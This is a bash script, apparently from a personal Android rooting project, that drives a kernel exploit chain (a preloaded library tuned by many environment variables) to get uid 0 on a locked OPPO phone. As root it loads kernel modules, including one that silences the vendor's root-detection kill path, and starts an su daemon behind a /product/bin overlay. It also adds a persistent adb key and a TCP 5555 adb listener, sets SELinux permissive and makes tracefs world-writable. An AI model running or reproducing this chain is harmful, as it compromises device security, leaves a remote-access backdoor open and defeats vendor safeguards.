#!/usr/bin/env bash
# Post-relock bootstrap: no APatch /system/bin/su, BL locked, stock boot.
# Roots ONE shell via the CVE preload chain and restores the whole
# ReSukiSU + su-daemon chain inside that single uid0 shell.
#
# Standard-mode era (2026-10-09): libgrant wrap + libkernelsu.so patch are
# RETIRED — the real kernelsu.ko answers the app through its [ksu_driver]
# fd (registered via the ksu_debug_manager_appid module param below).
#
# Why one shot: the preload constructor runs the exploit synchronously (and
# may pr_error/exit on ksud install failures), so every root step must be a
# single `toybox sh -c` script executed AFTER the constructor returns.
# Env guards (src/preload.c, src/root.c):
#   KSUD_DST= under /data/local/tmp  -> ksud write goes to staging (exists),
#                                       otherwise write to missing
#                                       /data/local/temp pr_error-kills us
#   KSUD_NO_PARENT_INSTALL=1         -> skips in-process ksud install
#   SU_INSTALL=0                     -> skip chain su install; we cp our own
#                                       static su (chain would write it into
#                                       /data/local/temp before it exists)
#
# Usage: tools/postlock.sh            (idempotent, re-runnable)
set -euo pipefail

REPO="$(cd "$(dirname "$0")/.." && pwd)"
APP=com.resukisu.resukisu
ACT=org.bakasu.bakasu.ui.MainActivity
STAGE=/data/local/tmp/ksu_boot
TMP=/data/local/temp

die() { echo "postlock: ERROR: $*" >&2; exit 1; }
step() { echo; echo "==> $*"; }

# --- adb ---------------------------------------------------------------
if [ -n "${ADB:-}" ]; then
  ADB_BIN=$ADB
elif command -v adb >/dev/null 2>&1; then
  ADB_BIN=$(command -v adb)
elif [ -x /mnt/c/WINDOWS/system32/adb.exe ]; then
  ADB_BIN=/mnt/c/WINDOWS/system32/adb.exe
else
  die "adb not found (set \$ADB)"
fi
ab() { "$ADB_BIN" "$@"; }
[ "$(ab get-state 2>/dev/null | tr -d '\r')" = device ] || die "no device"

# --- host artifacts ----------------------------------------------------
step "check host artifacts"
SU_SRC=$REPO/build/embed/su_daemon_aarch64_pie
PRELOAD_SRC=$REPO/build/pfum10c48/bin/preload.so
KO_SRC=$REPO/build/embed/kernelsu.ko
FIN_SRC=$REPO/build/embed/finitmod
# ocsk.ko (v8) silences the OPPO oplus_root_check_succ kill path; without
# it the real driver mode is unusable (app's libksud.so setuid trips the
# detector -> force_sig).  Must match this kernel exactly.
OCSK_SRC=$REPO/tools/ocsk/ocsk.ko
[ -f "$KO_SRC" ] || die "missing $KO_SRC (ReSukiSU kernelsu.ko build artifact, lives in build/embed/)"
[ -f "$FIN_SRC" ] || die "missing $FIN_SRC (NDK aarch64-linux-android31-clang -static -O2 -o build/embed/finitmod tools/finitmod.c)"
[ -f "$OCSK_SRC" ] || die "missing $OCSK_SRC (OPPO kill silencer, tools/ocsk/)"
if [ ! -f "$SU_SRC" ] || [ ! -f "$PRELOAD_SRC" ]; then
  (cd "$REPO" && make PROJECT=pfum10c48 -j"$(nproc)")
fi
[ -f "$SU_SRC" ] && [ -f "$PRELOAD_SRC" ] || die "make failed"

# manager appid (for the ROOT_SCRIPT below; resolve from package manager)
MUID=$(ab shell "pm list packages -U $APP" | tr -d '\r' | grep -oE 'uid:[0-9]+' | head -n1 | cut -d: -f2 || true)
[ -n "$MUID" ] || die "cannot resolve uid of $APP (installed?)"

# --- stage payloads (shell-writable, NO root needed) --------------------
step "stage payloads at $STAGE"
ab shell "mkdir -p $STAGE" || die "cannot create $STAGE (is /data/local/tmp gone?)"
ab push "$SU_SRC" "$STAGE/su" >/dev/null
ab push "$PRELOAD_SRC" "$STAGE/preload.so" >/dev/null
ab push "$KO_SRC" "$STAGE/kernelsu.ko" >/dev/null
ab push "$FIN_SRC" "$STAGE/finitmod" >/dev/null
ab push "$OCSK_SRC" "$STAGE/ocsk.ko" >/dev/null
# adb-loopback bootstrap (provision once, works from the next boot on):
#   1. persist.adb.tcp.port=5555 makes adbd listen on TCP 5555 at boot --
#      setprop is SELinux-denied (default_prop), so the value goes into
#      /data/property/persistent_properties as a raw protobuf entry and
#      init applies it during the next boot;
#   2. postlock_adbkey.pub in /data/misc/adb/adb_keys lets the PostLock
#      app (embedded private key) AUTH to that listener and get a SHELL
#      uid session -- the app uid itself cannot run the chain (tracefs /
#      mm_struct timing / configfs are all denied for untrusted_app).
# Both live under build/work (gitignored) and are regenerated ONLY when
# missing -- the keypair must stay stable forever or the pubkey baked
# into the PostLock app APK stops matching /data/misc/adb/adb_keys.
ADBKEY_DIR="$REPO/build/work/adbkeys"
PP_ENTRY="$REPO/build/work/pp_adb_tcp.bin"
if [ ! -f "$PP_ENTRY" ]; then
  python3 - > "$PP_ENTRY" <<'PY'
def wr(n):
    o = b""
    while True:
        x = n & 0x7f; n >>= 7
        o += bytes([x | (0x80 if n else 0)])
        if not n: return o
def st(f, v):
    b = v.encode(); return wr((f << 3) | 2) + wr(len(b)) + b
m = st(1, "persist.adb.tcp.port") + st(2, "5555")
import sys; sys.stdout.buffer.write(wr(10) + wr(len(m)) + m)
PY
  echo "generated $PP_ENTRY"
fi
if [ ! -f "$ADBKEY_DIR/postlock_adbkey" ] || [ ! -f "$ADBKEY_DIR/postlock_adbkey.pub" ]; then
  mkdir -p "$ADBKEY_DIR"
  rm -f "$ADBKEY_DIR/postlock_adbkey" "$ADBKEY_DIR/postlock_adbkey.pub"
  # adb keygen emits the canonical android_pubkey .pub format (base64 of
  # the modulus_size_words struct, "40 00 00 00" prefix) -- the ONLY
  # format adbd's key loader accepts.  The old openssl+DER path produced
  # "2048 <der-b64> ..." which adbd rejects outright ("Invalid base64 key
  # 2048", 2026-10-23: every line of adb_keys was in that broken format,
  # so no key ever verified and the app's AUTH dead-ended in a prompt the
  # framework auto-denies for TCP sources).
  "$ab" keygen "$ADBKEY_DIR/postlock_adbkey" >/dev/null
  sed -i "s/ .*/ postlock_bootstrap/" "$ADBKEY_DIR/postlock_adbkey.pub"
  echo "generated fresh adb keypair at $ADBKEY_DIR (APP APK MUST RE-EMBED IT)"
fi
ab push "$PP_ENTRY" "$STAGE/pp_adb_tcp.bin" >/dev/null
ab push "$ADBKEY_DIR/postlock_adbkey.pub" "$STAGE/postlock_adbkey.pub" >/dev/null
# +x matters: the root child's insmod helper gates on access(fm, X_OK) and
# runs the su daemon from stage on some paths; adb push lands 666.
ab shell "chmod 755 $STAGE/finitmod $STAGE/su" >/dev/null 2>&1 || true

# libkernelsu.so patch + libgrant wrap: RETIRED (2026-10-09) — the app gets
# version/uAPI/late-load from the real driver fd; do not re-add JNI fakery.

# --- the single root script (MUST NOT contain single quotes) -----------
step "build restore script (manager uid=$MUID)"
# The restore runs as a FILE via the chain's KS_COLDSTART fork (root.c
# 1545: after self-patch setuid(0) succeeds AND finitmod loads
# kernelsu.ko), not as a -c string after the constructor returns.  Round
# 61: that old carrier hit `mkdir: Permission denied` right after the
# uid0 contract line; KS_COLDSTART forks from the same process but is
# gated on getuid()==0, and the script's first lines capture the real
# identity so a repeat is attributable in one shot.
RESTORE_LOCAL="$REPO/build/work/postlock_restore.sh"
mkdir -p "$(dirname "$RESTORE_LOCAL")"
cat > "$RESTORE_LOCAL" <<EOF
#!/system/bin/sh
exec >> /data/local/tmp/postlock_restore.log 2>&1
echo "== restore start \$(date) pid=\$\$ uid=\$(id -u)"
id
ls -ld /data /data/local /data/local/temp 2>&1 || true
getenforce 2>/dev/null || true
set -e
mkdir -p $TMP
chcon u:object_r:shell_data_file:s0 $TMP
chmod 777 $TMP
echo 262144 > /proc/sys/fs/pipe-user-pages-soft
# rm-before-cp: a rerun copies over binaries the previous run left running
# (su daemon executes $TMP/su) -> cp hits ETXTBSY and set -e aborts
# mid-script. unlink-then-copy is always safe: the old process keeps its
# unlinked inode, and the daemon/app restart below pick up the fresh file.
for f in kernelsu.ko finitmod ocsk.ko su preload.so; do
  rm -f $TMP/\$f
  cp $STAGE/\$f $TMP/\$f
done
chmod 755 $TMP/kernelsu.ko $TMP/finitmod $TMP/ocsk.ko $TMP/su $TMP/preload.so
if grep -q ^kernelsu /proc/modules; then echo driver-already-loaded; else $TMP/finitmod $TMP/kernelsu.ko 0 || echo WARN-finitmod-failed; fi
# ocsk: silence the OPPO oplus_root_check_succ kill path BEFORE the app
# restarts below -- without it libksud.so setuid(0) trips the detector
# and force_sig kills the app (round 60 verified 61/61 kills intercepted).
# WARN-only: sig_enforce is 0 on this boot because the chain just ran.
if grep -q ^ocsk /proc/modules; then echo ocsk-already-loaded; else $TMP/finitmod $TMP/ocsk.ko 0 arm=1 || echo WARN-ocsk-finitmod-failed; fi
# register the manager appid so zygote setresuid installs the
# [ksu_driver] fd for the manager (CONFIG_KSU_DEBUG param; must
# precede the app start)
if [ -w /sys/module/kernelsu/parameters/ksu_debug_manager_appid ]; then
  echo $MUID > /sys/module/kernelsu/parameters/ksu_debug_manager_appid
fi
[ -f $TMP/su.allow ] || { echo 10282 > $TMP/su.allow; echo 10283 >> $TMP/su.allow; echo 2000 >> $TMP/su.allow; }
chmod 666 $TMP/su.allow
# --- adb-loopback bootstrap (idempotent) ---------------------------------
# postlock pubkey -> /data/misc/adb/adb_keys: lets the PostLock app AUTH
# to adbd and obtain a shell-uid session (the only uid that can run the
# chain on a fresh boot).  Also drops legacy "2048 " prefixed lines --
# adbd rejects them outright ("Invalid base64 key 2048", 2026-10-23:
# every line was in that broken format, so no key ever verified and the
# app AUTH dead-ended in a prompt the framework auto-denies on TCP).
# grep -F on the binary keys file is safe.
if grep -q "^2048 " /data/misc/adb/adb_keys 2>/dev/null || ! grep -qF postlock_bootstrap /data/misc/adb/adb_keys 2>/dev/null; then
  grep -v "^2048 " /data/misc/adb/adb_keys > $TMP/adb_keys.new 2>/dev/null || true
  cat $TMP/adb_keys.new > /data/misc/adb/adb_keys 2>/dev/null || true
  rm -f $TMP/adb_keys.new
  cat $STAGE/postlock_adbkey.pub >> /data/misc/adb/adb_keys || echo WARN-adb-keys-append
  chmod 640 /data/misc/adb/adb_keys || true
  chown root:shell /data/misc/adb/adb_keys || true
fi
# persist.adb.tcp.port=5555 -> persistent_properties (raw protobuf entry,
# 30 bytes, generated by build/work/pp_adb_tcp.bin): setprop on this name
# is SELinux-denied (default_prop) even as root, but init applies the
# persisted value itself at boot and adbd then listens on [::]:5555.
# Takes effect from the NEXT reboot; harmless when already present.
if ! grep -qF persist.adb.tcp.port /data/property/persistent_properties 2>/dev/null; then
  cat $STAGE/pp_adb_tcp.bin >> /data/property/persistent_properties || echo WARN-pp-append
fi
# phantom-process killer off (persist): AMS culled the app-uid chain's
# >32 clone children as "Trimming phantom processes" (rounds 1/2/4 silent
# kills).  It is a framework quota reaper, not a security boundary; the
# setting survives reboots but not a factory reset.  Written via settings
# (root here; untrusted_app cannot write global settings).
settings put global settings_enable_monitor_phantom_procs false 2>/dev/null || echo WARN-phantom-settings
for p in \$(ps -A -o PID=,ARGS= | grep "su --daemon" | grep -v grep | sed "s/ .*//"); do kill -9 \$p 2>/dev/null || true; done
rm -f $TMP/su.sock $TMP/su.pid
setsid $TMP/su --daemon >> $TMP/su.log 2>&1 < /dev/null &
sleep 1
if [ ! -x /product/bin/su ]; then
  mkdir -p $TMP/ovl/lower $TMP/ovl/tmp
  mountpoint -q $TMP/ovl/lower || mount --bind /product/bin $TMP/ovl/lower
  mountpoint -q $TMP/ovl/tmp || mount -t tmpfs -o size=16m tmpfs $TMP/ovl/tmp
  mkdir -p $TMP/ovl/tmp/upper $TMP/ovl/tmp/work
  rm -f $TMP/ovl/tmp/upper/su
  cp $TMP/su $TMP/ovl/tmp/upper/su
  chmod 755 $TMP/ovl/tmp/upper/su
  mount -t overlay overlay -o lowerdir=$TMP/ovl/lower,upperdir=$TMP/ovl/tmp/upper,workdir=$TMP/ovl/tmp/work,context=u:object_r:system_file:s0 /product/bin
fi
am force-stop $APP || true
sleep 1
am start -n $APP/$ACT > /dev/null 2>&1 || true
echo POSTLOCK-RESTORE-OK
EOF
sh -n "$RESTORE_LOCAL" || die "restore.sh syntax error"
ab push "$RESTORE_LOCAL" "$STAGE/restore.sh" >/dev/null || die "cannot push restore.sh to $STAGE"

# --- ONE exploit run ----------------------------------------------------
step "trigger exploit (constructor blocks until rooted; then script runs as uid0)"

# Tier-1 assist (APatch still present — pre-final-lock testing):
#   * layout measurement needs kprobes; shell has neither DAC (tracefs
#     600) nor MAC (Enforcing) access, and the static pvo=0 fallback
#     fails the physmap window check -> measure via root SLIDE_ONLY and
#     pass KS_LAYOUT_PVO/KS_LAYOUT_VM.  pvo rolls EVERY boot (0x468/0x4e8/
#     0x554/0x790 x 0x10000000 seen so far) so it can never be baked in.
#   * runtime kprobe event files (enable/filter) are created 644 at
#     registration time -> root chmod of the pre-existing tree does not
#     cover them; the preload's KS_TRACEFS_SUDO fallback writes them via
#     su.  Reads need permissive + 777 tracing for uid2000.
#   * On a truly locked device neither su nor the measure step exists:
#     pvo stays 0, prepare fails the window check, trigger fails SAFE
#     (no route -> no panic).  Locked-tier needs a shell-side pvo leak.
SU=/system/bin/su
PVO= VMEM=

# Leftover from an interrupted run (host timeout, dropped adb): two chains
# on one boot is chaos, and a SIGKILLed route can leave dangling PI state.
# TERM first (lets owner thread FUTEX_UNLOCK_PI if it is waiting on it),
# escalate only if it survives.
if ab shell "pgrep -f 'preload\.so' >/dev/null 2>&1"; then
  echo "WARN: leftover preload process(es) found, terminating:"
  ab shell "pgrep -f 'preload\.so'" || true
  ab shell "pkill -TERM -f 'preload\.so'" 2>/dev/null || true
  for _ in $(seq 1 15); do
    ab shell "pgrep -f 'preload\.so' >/dev/null 2>&1" || break
    sleep 1
  done
  if ab shell "pgrep -f 'preload\.so' >/dev/null 2>&1"; then
    echo "WARN: leftover still alive, SIGKILL (slot file may be mid-write)"
    ab shell "pkill -9 -f 'preload\.so'" 2>/dev/null || true
    sleep 1
  fi
fi

if ab shell "test -x $SU" >/dev/null 2>&1; then
  step "Tier-1 pre-steps (permissive, tracefs, slot file, layout measure)"
  ab shell "$SU -c 'setenforce 0; chmod -R 777 /sys/kernel/tracing; chmod 666 /data/local/tmp/.ks_lock_slots 2>/dev/null; true'" >/dev/null 2>&1 || true
  LAYOUT=$(ab shell "$SU -c 'LD_PRELOAD=$STAGE/preload.so SLIDE_ONLY=1 /system/bin/true'" 2>/dev/null \
    | grep -m1 'layout ' || true)
  PVO=$(printf '%s\n' "$LAYOUT" | sed -n 's/.* pvo=\([0-9a-fA-F]*\) .*/\1/p')
  VMEM=$(printf '%s\n' "$LAYOUT" | sed -n 's/.*vmemmap=\[\([0-9a-fA-F]*\)-.*/\1/p')
  if [ -z "$PVO" ] || [ -z "$VMEM" ]; then
    echo "WARN: layout measure failed (LAYOUT='$LAYOUT'); trigger will fail safe"
    PVO= VMEM=
  else
    echo "measured pvo=$PVO vmem=$VMEM"
  fi
fi

TRIGGER_ENV="KS_LOG_SYNC=1 KS_PSELECT_BSS_LOCK=1 KS_CFGFS_LOG=1 KS_PAYLOAD_SCAN=1 KSNITCH_VERBOSE=1"
# Aligned with run_fops.sh's proven CHAIN_ENV (2026-10-19): both were
# missing here.  KS_PSELECT_FOPS_VOFF=1 cancels the measured +1 content
# shift (run7 pc decode; VOFF=0 panicked at SET_NAME in run5/6/7) and
# KS_RECLAIM_DETERMINISTIC=1 pins the reclaim order.  PVO stays unset on
# purpose: the chain measures it fresh, and a stale value from another
# boot fails the physmap window check (round 60 ran root=1 with the
# static fallback in effect -- the window check passes without PVO).
TRIGGER_ENV="$TRIGGER_ENV KS_RECLAIM_DETERMINISTIC=1 KS_PSELECT_FOPS_VOFF=1"
TRIGGER_ENV="$TRIGGER_ENV KSUD_DST=$STAGE/ksud KSUD_NO_PARENT_INSTALL=1 SU_INSTALL=0"
# KS_COLDSTART carrier (root.c:1545): forked sh runs restore.sh uid0 after
# self-patch setuid(0) AND finitmod kernelsu.ko both succeed.  Caveat: on a
# boot where kernelsu.ko is ALREADY loaded the finitmod exits EEXIST and
# the restore is skipped -- this path is for fresh boots (postlock's
# real scenario); boot-internal recovery must reboot first anyway.
TRIGGER_ENV="$TRIGGER_ENV KS_COLDSTART=$STAGE/restore.sh KS_FINITMOD=$STAGE/finitmod KS_KO=$STAGE/kernelsu.ko"
TRIGGER_ENV="$TRIGGER_ENV KS_PIPE_SLABS=15 KS_PAYLOAD_BASE_FILE=$STAGE/skbdelta"
if ab shell "test -x $SU" >/dev/null 2>&1; then
  # only meaningful while a su binary exists (APatch era); empty/absent
  # after relock the preload falls back to direct writes and fails safe
  TRIGGER_ENV="$TRIGGER_ENV KS_TRACEFS_SUDO=$SU"
fi
if [ -n "$PVO" ]; then
  # 0x prefix: keeps the value unambiguous regardless of the parser's
  # base (bare leading-zero strings were once read as octal -> pvo=7).
  TRIGGER_ENV="$TRIGGER_ENV KS_LAYOUT_PVO=0x$PVO KS_LAYOUT_VM=0x$VMEM"
fi
# KS_PIPE_SLABS=15: this trigger runs as shell with the stock
# fs/pipe-user-pages-soft=16384 (no root yet to raise it); the default
# 64-slab drain/reclaim set would hit F_SETPIPE_SZ and pr_error-kill the
# bootstrap sh.  The root script above raises the soft cap afterwards for
# any later regression run in the same boot.
# /system/bin/sh, NOT toybox sh: this device's toybox has no sh builtin.
# Chain stdout goes to a f2fs file: without it a failed trigger leaves
# zero forensics (round 61: tail -80 on the adb stream was all we got,
# the window-phase rows were gone).  The restore itself runs inside the
# chain via KS_COLDSTART -- the -c string is only the constructor's
# carrier process, so it is a one-liner again.
CHAIN_OUT=/data/local/tmp/postlock_chain.log
# DETACHED (setsid nohup): a synchronous ab shell would die with the host
# timeout / adb drop and leave the chain half-way through the route --
# dangling fops state that panics on the next misc open (AGENTS; round
# c23b8a27->e4eaa672).  The chain survives adb disconnects; the poll
# below reads the log file instead of the stream.
ab shell "rm -f $STAGE/skbdelta $CHAIN_OUT /data/local/tmp/postlock_restore.log; setsid nohup env LD_PRELOAD=$STAGE/preload.so $TRIGGER_ENV /system/bin/sh -c 'echo CHAIN_EXIT_DONE' > $CHAIN_OUT 2>&1 < /dev/null & echo DETACHED" \
  || echo "WARN: detach failed (see $CHAIN_OUT)"

# --- wait for the async KS_COLDSTART restore -----------------------------
# The restore forks inside the chain (root.c coldstart fork) and keeps
# running after the constructor returns; verify must not race it.  Success
# markers: the RESTORE-OK line, or the overlay target it creates.
step "wait for restore (KS_COLDSTART fork)"
RESTORE_OK=0
for _ in $(seq 1 90); do
  if ab shell "grep -q POSTLOCK-RESTORE-OK /data/local/tmp/postlock_restore.log 2>/dev/null" \
     || ab shell "[ -x /product/bin/su ]" 2>/dev/null; then
    RESTORE_OK=1
    break
  fi
  sleep 2
done
if [ "$RESTORE_OK" = 1 ]; then
  echo "  restore OK; tail:"
  ab shell "tail -8 /data/local/tmp/postlock_restore.log 2>/dev/null" | sed 's/^/    /' || true
else
  echo "WARN: restore marker not seen after 180s"
  ab shell "cat /data/local/tmp/postlock_restore.log 2>/dev/null" | tail -15 | sed 's/^/    /' || true
  echo "  chain log tail:"
  ab shell "tail -25 $CHAIN_OUT 2>/dev/null" | sed 's/^/    /' || true
fi

# --- verify as shell (uid 2000 is seeded; uid 0 is NOT in su.allow) -----
step "verify"
ab shell "/product/bin/su -c id" | grep -q "uid=0" || die "/product/bin/su failed (daemon/overlay/allow?)"
ab shell "grep -q ^kernelsu /proc/modules" || die "kernelsu.ko not loaded"
if ab shell "getprop wrap.$APP" | grep -q "libgrant"; then
  die "legacy libgrant wrap still set — clear it: setprop wrap.$APP \"\""
fi
CUR_MUID=$(ab shell "/product/bin/su -c 'cat /sys/module/kernelsu/parameters/ksu_debug_manager_appid'" | tr -d '\r')
[ "$CUR_MUID" = "$MUID" ] || echo "WARN: manager param=$CUR_MUID, want $MUID (app fd may be missing)"
echo "OK:"
echo "  $(ab shell "/product/bin/su -c id" | tr -d '\r')"
echo "  $(ab shell "grep ^kernelsu /proc/modules" | tr -d '\r')"
echo "  daemon pid=$(ab shell "cat $TMP/su.pid 2>/dev/null" | tr -d '\r')"
echo "  manager uid=$CUR_MUID  wrap.$APP=$(ab shell "getprop wrap.$APP" | tr -d '\r') (must be empty)"
# pidof rc=1 when the app is not running; pipefail would kill the script
# after all verify steps passed (round 998d4c8d: OK: printed, rc=1).
APID=$(ab shell "pidof $APP 2>/dev/null" | tr -d '\r' | awk '{print $1}' || true)
if [ -n "$APID" ] && ab shell "/product/bin/su -c 'ls -l /proc/$APID/fd 2>/dev/null | grep -q ksu_driver'"; then
  echo "  app fd: [ksu_driver] present (pid $APID)"
else
  echo "  WARN: app fd not confirmed — restart the app if the blue card is missing"
fi
echo
echo "manual check: ReSukiSU blue card, driver == manager UAPI, no 越狱模式 badge"
